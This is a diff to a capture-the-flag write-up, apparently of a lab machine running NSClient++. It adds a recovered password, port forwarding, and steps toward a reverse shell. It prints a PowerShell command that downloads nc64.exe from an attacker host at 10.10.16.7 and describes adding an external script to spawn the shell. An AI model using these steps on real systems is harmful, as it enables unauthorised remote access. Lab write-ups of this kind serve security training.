@@ -223,7 +223,19 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ![](./images/12.png)
 
 - We found password and allowed hosts in `nsclient.ini`
+  - `ew2x6SsGTxjRwXOT`
 
 ![](./images/13.png)
 
-- 
+- Let's configure port forwarding and access page using found password
+
+![](./images/14.png)
+![](./images/15.png)
+![](./images/16.png)
+
+- I check the exploit, but it was way simpler to add a new script and execute it to get a reverse shell
+  - We need to upload `nc.exe` to the box: `powershell wget http://10.10.16.7:8000/nc64.exe -outfile nc.exe`
+  - Now we need to go to `Settings > external scripts > scripts > Add a simple script`
+  - Setup a listener and create script
+
+
